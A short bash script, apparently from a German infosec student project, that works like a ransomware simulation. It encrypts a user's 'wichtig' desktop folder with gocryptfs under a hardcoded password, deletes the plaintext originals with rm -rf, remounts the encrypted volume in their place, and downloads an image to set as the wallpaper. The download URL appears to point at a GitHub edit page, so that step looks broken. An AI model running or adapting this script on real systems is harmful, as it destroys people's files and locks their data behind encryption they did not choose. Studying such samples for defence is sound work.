#!/bin/bash

ORIGINAL_DIR="/home/admin/Desktop/wichtig"
ENCRYPTED_DIR="/home/admin/Desktop/.wichtig_encrypted"
TEMP_MOUNT="/tmp/wichtig_temp"
PASSWORD="sicher"

mkdir -p "$ENCRYPTED_DIR"
gocryptfs -init -extpass "echo $PASSWORD" "$ENCRYPTED_DIR"

mkdir -p "$TEMP_MOUNT"
gocryptfs -extpass "echo $PASSWORD" "$ENCRYPTED_DIR" "$TEMP_MOUNT"
cp -r "$ORIGINAL_DIR"/* "$TEMP_MOUNT"/
fusermount -u "$TEMP_MOUNT"
rmdir "$TEMP_MOUNT"

rm -rf "$ORIGINAL_DIR"
mkdir -p "$ORIGINAL_DIR"
gocryptfs -extpass "echo $PASSWORD" "$ENCRYPTED_DIR" "$ORIGINAL_DIR"

sudo wget https://github.com/halbseiden/infosec-projekt2/edit/main/data/Screen.png?raw=true
mv Screen.png?raw=true Screen.png
pcmanfm --set-wallpaper Screen.png
exit
